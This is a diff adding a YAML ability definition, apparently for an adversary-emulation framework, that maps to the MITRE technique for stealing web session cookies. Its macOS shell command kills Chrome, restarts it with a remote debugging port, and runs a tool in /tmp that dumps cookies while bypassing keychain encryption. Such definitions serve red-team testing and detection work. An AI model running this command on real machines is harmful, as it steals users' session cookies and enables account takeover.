@@ -1,0 +1,28 @@
+---
+- id: f72ac3289125329d3467bd2fb7fdd8f4
+  name: Steal Chrome Cookies via Remote Debugging (Mac)
+  description: 'The remote debugging functionality in Chrome can be used by malware
+    for post-exploitation activities to obtain cookies without requiring keychain
+    access. By initiating Chrome with a remote debug port, an attacker can sidestep
+    encryption and employ Chrome''s own mechanisms to access cookies.
+
+
+    If successful, this test will output a list of cookies.
+
+
+    Note: Chrome processes will be killed during this test.
+
+
+    See https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e'
+  tactic: credential-access
+  technique:
+    attack_id: T1539
+    name: Steal Web Session Cookie
+  platforms:
+    darwin:
+      sh:
+        command: killall 'Google Chrome'; sleep 1; open -a "/Applications/Google Chrome.app/Contents/MacOS/Google
+          Chrome" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/;
+          sleep 1; /tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337
+        payloads: []
+        cleanup: rm -rf /tmp/WhiteChocolateMacademiaNut
